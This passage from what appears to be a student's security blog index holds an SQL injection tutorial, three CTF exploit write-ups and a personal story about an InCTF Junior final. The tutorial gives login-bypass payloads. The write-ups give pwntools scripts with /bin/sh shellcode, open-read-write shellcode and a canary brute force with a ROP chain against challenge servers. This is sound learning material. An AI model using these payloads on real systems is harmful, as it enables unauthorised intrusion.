manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.\nSQL: # SQL or Structured Query Language is just a way to talk to the database and manipulate the data by the program. In most Database management systems SQL language is used. This blog post is divided into basics of sql and exploitation of sql.\nSQL Basics: # Creating a Database: # In order to follow this blog post it\u0026rsquo;ll be helpfull to have mysql installed. First we will create and use a Database in mysql called testdb. Now this database can use used to store multiple tables where each table can be used to store different types of datas. For example a login table can be used to store all usernames and passwords and a store website can use another table to store all their products and prices with it.\nCreating tables: # For the fun of it lets create a table called person since everyone has their own unique features. By features I mean their name, height and weigth.\nAccess the data: # Inorder to get the required data we use SELECT statements. when we have lines of select statements and commands to give to the databases we call them queries.\nnote: * means everything (all)\nHere we are select everything present in the table called person.\nWhen we have multiple number of objects in our table we can use a element present in each object that is unique. Most of the time our names our unique so we can access our object with the help of out name.\nLogin system: # In our login system (which we will use to hack) we have used sql query to check if the user and password given my the user is correct. The pseudo code is given below:\n\u0026lt;?php $sql = \u0026#34;SELECT id FROM admin WHERE username = \u0026#39;$myusername\u0026#39; and passcode = \u0026#39;$mypassword\u0026#39;\u0026#34;; $result = mysqli_query($db,$sql); # Send the sql query to DataBase $row = mysqli_fetch_array($result,MYSQLI_ASSOC); # Fetchs a result row as a array if($count != 0) { echo \u0026#34;Success! \u0026#34; # Tell the user the login creds were correct } else{ echo \u0026#34;Invalid \u0026#34; # Tell the user the login creds were incorrect } ?\u0026gt; Different Exploitation Techniques: # Simple login bypass: # We can see that there are 2 users in the table. Obviously in the real world application there wont be a table showing the credentials, inorder for learning purpose I have made them visible. Now lets check if there is a sql injection possible.\nNow If you are following the blog correctly you would have already know that this error is due to the \u0026rsquo; (single quote) I gave. So the query looks like\nSELECT id FROM admin WHERE username = \u0026#39;\u0026#39; \u0026#39; and passcode = \u0026#39;a\u0026#39; The unmatched single quotes make the query break and thereby telling us there are chances for a SQLInjection. Also a point to note is, its not required to get an error every time to prove there is a SQL Injection. Infact in most real world applications you would be left with blind sql injections which doesnt give you any output (covered later in this blog).\nSo we will use basic boolean logic for the first attack. We will tell the SQL Query that the username is true and passcode is true. So this will return the entire table and mostly likely we will be logged in as the first user (extreme case, likely never happens).\nHere we can see I gained access as tourpran who is the first user. Also in the query I managed to say that username='' or TRUE which will always be true, same for the password.\nWe can also login as admin if we pass the following credentials.\nUserName: admin password: \u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a SELECT id FROM admin WHERE username = \u0026#39;admin\u0026#39; and passcode = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; or username: \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 password: \u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and username=\u0026#39;admin\u0026#39; ; # SELECT id FROM admin WHERE username = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and passcode = \u0026#39;\u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and username=\u0026#39;admin\u0026#39; ; #\u0026#39; # - comment the rest of the line ","date":"2020-08-06","externalUrl":null,"permalink":"/posts/1728230180964-sql-injection-web/","section":"Blog Posts","summary":"","title":"SQL Injection [web]","type":"posts"},{"content":"","date":"2020-07-17","externalUrl":null,"permalink":"/tags/pwnable.tw/","section":"Tags","summary":"","title":"Pwnable.tw","type":"tags"},{"content":"Here our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.\nSolution: # First I check the mitigations :\nSo I think it\u0026rsquo;s going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don\u0026rsquo;t have to worry about the address changing every time :) Now, let us run the binary and see what is happening :\u0026gt;\nSo it\u0026rsquo;s simple just asking input and printing something. Now its time to see the assembly behind this binary.\nSo we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack. If we examine them we can see that they are the strings that are printed when we run the binary. Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P. Also INT 0x80 is equivalent to syscall. We can observe 2 syscalls being called\nThe first syscall is used to make the write. (For printing the string)\nThe second syscall is used to call read ( Probably to take our input ). Now let\u0026rsquo;s see what we can do to get root access !!\nI hope you find the offset by yourself or try pattern create in gdb-peda. :)\nIdea: # We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP) So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell! Remember the write syscall prints the buffer pointed by the ECX.\nAfter the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes) Crafting the Exploit: # first 20 bytes to fill the buffer then put the address of move ESP to ECX. So first input will give the ESP. Next, we place the shellcode (from shellstorm.org) then execute it. We don\u0026rsquo;t have to worry about the shift of the stack because there is no PIE from pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) print(p.read()) buf = \u0026#39;A\u0026#39;*20 buf += p32(0x08048087) p.send(buf) esp = unpack(p.read()[:4]) print hex(esp) p.interactive() note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.\nOutput: 0xff819750\nFinal Exploitation # We place the shellcode then just execute it, in the read that followed the write. from pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) print(p.read()) buf = \u0026#39;A\u0026#39;*20 buf += p32(0x08048087) p.send(buf) esp = unpack(p.read()[:4]) shellcode = b\u0026#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#39; #new exploit buf = \u0026#39;a\u0026#39;*20 buf += p32(esp+20) buf += shellcode p.send(buf) p.interactive() I hope you liked the write-up. More writeups on its way.\n","date":"2020-07-17","externalUrl":null,"permalink":"/writeups/1728230780562-start-pwnable.tw/","section":"Writeups","summary":"\u003cp\u003eHere our main objective is to get a shell. The bug is plain and simple, it is an overflow to control the return address.\u003c/p\u003e","title":"start [pwnable.tw]","type":"writeups"},{"content":"This is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.\nSolution: # First I check the mitigations :\nWe have NX disabled. That means it is something to do with the shellcode. Seems like there is a canary which will not allow you to do a stack based buffer overflows. there is no pie so the address of the binary will be same every time you run. Let\u0026rsquo;s see the disassembly of this program Here we can see that our input is being put in the address 0x804a060 and then it is moved to EAX and then after that EAX is called. Meaning: our input is being executed. Now, let us run the binary and see what is happening :\u0026gt;\nHmm… We get a segfault.\nIdea: # As said in the question we will you three syscalls and then get the flag First call: open the flag file Second call: read the file Third call: write it to the output Exploit: # We will see the exploit in parts.\nPart 1 # We make EAX to 5 we push the string \u0026ldquo;///home/orw/flag\u0026rdquo; We make EBX pointing to the stack ( the string ) We make EDX equal to 0 and then we make the syscall. Part 2 # We make EAX equal to 3 We make ECX point to the string Give EDX the buffer size Call the syscall Part 3 # We make EAX equal to 4 Make EBX equal to 0 Add 1 to EBX / making EBX equal to 1. Then call the syscall. Refer to the below image if having any doubts !!\nIf we put all of the things together, then we get the flag.\nfrom pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;,10001) print p.recv() s = asm(\u0026#34;xor eax, eax\u0026#34;) s += asm(\u0026#34;push eax\u0026#34;) s += asm(\u0026#34;add eax, 5\u0026#34;) s += asm(\u0026#34;push 0x67616c66\u0026#34;) s += asm(\u0026#34;push 0x2f77726f\u0026#34;) s += asm(\u0026#34;push 0x2f656d6f\u0026#34;) s += asm(\u0026#34;push 0x682f2f2f\u0026#34;) s += asm(\u0026#34;mov ebx, esp\u0026#34;) s += asm(\u0026#34;mov edx, 0\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) s += asm(\u0026#34;mov eax, 3\u0026#34;) s += asm(\u0026#34;mov ecx, ebx\u0026#34;) s += asm(\u0026#34;mov ebx, 3\u0026#34;) s += asm(\u0026#34;mov edx, 40\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) s += asm(\u0026#34;mov eax, 4\u0026#34;) s += asm(\u0026#34;mov ebx, 0\u0026#34;) s += asm(\u0026#34;inc ebx\u0026#34;) s += asm(\u0026#34;int 0x80\u0026#34;) p.send(s) f = p.recv() print f p.interactive() update: Back when I wrote this, it was python2, times were good.\nIf you want to try out more pwnable.tw but are stuck you can checkout pwn-hub: pwnable.tw repo\n","date":"2020-07-16","externalUrl":null,"permalink":"/writeups/1728230795518-orw-pwnable.tw/","section":"Writeups","summary":"\u003cp\u003eThis is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.\u003c/p\u003e","title":"ORW [pwnable.tw]","type":"writeups"},{"content":"I am proud to say that my team zh3r0 hosted its first CTF. This blog covers a challenge called c4n4ry, which might have something to do with the stack canary.\nChallenge description: # Solution: # First step: # Analyze the binary and then check its mitigations.\nNX is enabled so no shellcodes. PIE is disabled and also ASLR was disabled so no worries of the address changing. Now, let us run the binary and then see !! We can say that there was a continuous loop running. Also if we analyze the binary carefully we can see the name and input were not vulnerable but the description was using gets which reads arbitrary input.Now we can disassemble the main file now.\nGETS is vulnerable but… There is an additional memory compare. We can say that it might be our canary. The idea for the exploit: # Our first step will be in calculating the offset for the canary. I use pwntools pwn cyclic function but you guys can do anything.\nInside GDB: # I set a break at the memory compare. I use pwntools to analyze what is being compared with what Note: I also set up a fake canary to work with the binary locally Then I analyzed the string that was being compared with the help of pwntools.\nI got the offset as 192 for the canary. Now let me make a script to get a shell.\nfrom pwn import * \u0026#39;\u0026#39;\u0026#39; system address = 0x400780 \u0026#39;\u0026#39;\u0026#39; p = remote(\u0026#34;134.209.157.250\u0026#34;, 5084) p.sendline(\u0026#34;1\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) buf = (\u0026#39;a\u0026#39;*192) buf += (\u0026#39;abcd\u0026#39;) So I set the canary to be “abcd” and then I searched for some ROP and before that, I also got the offset for the ret to be 20 bytes. So I created a ROP chain.\nnow it\u0026rsquo;s just combining all of the gadgets that\u0026rsquo;s it.\nFinal step: # I need to brute force the canary. It was damn easy cause i told them the hints that the canary was going to be small letters and was going to be in order.\nfrom pwn import * \u0026#39;\u0026#39;\u0026#39; sys = 0x400780 \u0026#39;\u0026#39;\u0026#39; for i in range(80, 123): p = remote(\u0026#34;134.209.157.250\u0026#34;,5084) p.sendline(\u0026#34;1\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) buf = (\u0026#39;a\u0026#39;*192) buf += chr(i)+chr(i+1)+chr(i+2)+chr(i+3) buf += (\u0026#39;a\u0026#39;*20) buf += (p64(0x400936)) # pop r12 buf += (\u0026#34;/bin/sh;\u0026#34;) buf += (p64(0x400933)) # pop r11 buf += (p64(0x6020B0)) # just a random address to write to buf += (p64(0x400927)) # mov [r11], r12 buf += (p64(0x0000000000400939)) # pop rdi buf += (p64(0x6020B0)) # write address buf += (p64(0x400780)) # system p.sendline(buf) p.interactive() I just made the loop a bit big but what is the problem :P Conclusion # This was my first attempt to make a canary problem. So hope you liked this. Will be posting more blogs soon.\n","date":"2020-03-06","externalUrl":null,"permalink":"/writeups/1728230734805-c4n4ry-zh3r0-ctf/","section":"Writeups","summary":"","title":"c4n4ry [zh3r0 CTF]","type":"writeups"},{"content":"","date":"2020-03-06","externalUrl":null,"permalink":"/tags/canary/","section":"Tags","summary":"","title":"Canary","type":"tags"},{"content":"","date":"2020-03-06","externalUrl":null,"permalink":"/tags/zh3r0/","section":"Tags","summary":"","title":"Zh3r0","type":"tags"},{"content":"","date":"2019-09-29","externalUrl":null,"permalink":"/tags/experience/","section":"Tags","summary":"","title":"Experience","type":"tags"},{"content":"","date":"2019-09-29","externalUrl":null,"permalink":"/tags/life/","section":"Tags","summary":"","title":"Life","type":"tags"},{"content":"There was too much to learn than to compete in the competition. Spoiler alert, this is my first CTF finals, hope that justifies all the drama. Before jumping to my story…\nBasically, CTF (Capture The Flag) is a kind of information security competition that challenges contestants to solve a variety of tasks ranging from a scavenger hunt on Wikipedia to basic programming exercises to hacking your way into a server to steal data. In layman’s terms, Just a way to learn “hacking”.\nA quick gist about the competition: INCTFJ Amrita InCTF Junior is a National level Cybersecurity contest for high school students in India. Their main aim is to induce a new field in the minds of young people. Now coming to our story… It all started when I wanted to hack. :P\nBEFORE THE CONTEST: # I am just a high school kid who wanted to be like LiveOverFlow and GeoHotz. I was of course motivated by many to start hacking in which my brother played a key role. Also, I had a good mentor who was already established in the field of cybersecurity from his years at bios, the cybersecurity club at Amrita University.\nAFTER THE QUALIFIERS: # I took part in the annual INCTFJ competition, in which I got selected for the grand finale. The next thing I did was, pack my bag and called someone for accompanying me to the onsite finals. We (my brother and I) took a bus to Kollam (place, where the finals took place). Finally, we reached there early in the morning so we went to sleep. The next day some other participants from the next room who were just like me (energetic and happy) engaged in small talk with me and I got along with them very well. They kept company throughout the competition leading all the way up to today.\nDURING THE WORKSHOPS: # I along with my new friends went to the registration site to enroll our names for the finals and we got ourselves a badge that was priceless for me. I kept it with myself for the whole time.\nEnjoyed a bit too much with friends and never left the mentors free. The mentors were soo encouraging and enthusiastic. They also loved to help the participants.\nFOOD : # We were greeted like guests and were given delicious food — super hot and was mouth-watering.￼ We were given lunch and dinner at the place where the college students were given food.\nSTUDY TIME: # They (mentors from Amrita) taught us much stuff that included things like:\nWeb exploitation Standard Query Language reverse engineering some cool stuff GRAND FINALE: # It was finally time. This was the moment we were all waiting for, the “ INCTFJ finals”. To be honost we were both nervous and happy the contest started. I could hardly solve six to seven challenges. It was a bit tough as I expected, still I was happy because my friend said he was in the top 5. After the finals were over, we were sent to our rooms. meanwhile,\nPARTY! PARTY! : # We were sent to the party hall and “surprise surprise” they had a party which was organized by the campus. I could not believe my eyes, it was Stephen Devassy — The lead pianist… He totally rocked it. It was so great. It was the perfect time to blend in with my friends and have fun. When we arrived at the campus the view itself blew me away and I was stunned for some seconds … I was disappointed when the results came but were motivated to do more of CTFs and to learn more things. I knew, sometimes falling down today, gives us a chance to rise tomorrow.\nTHINGS I LEARNED: # learned to be independent knew I had soo much to learn understood that there were kids of my age who were greater than me Understood the true meaning of friendship and fun… Hope you have a time like this…BYE… ","date":"2019-09-29","externalUrl":null,"permalink":"/posts/1728230565134-my-first-ctf-life/","section":"Blog Posts","summary":"\u003cp\u003e\u003cstrong\u003eThere was too much to learn than to compete in the competition.\u003c/strong\u003e Spoiler alert, this is my first CTF finals, hope that justifies all the drama.\nBefore jumping to my story…\u003c/p\u003e","title":"My First CTF [life]","type":"posts"},{"content":"","externalUrl":null,"permalink":"/about/","section":"About","summary":"","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]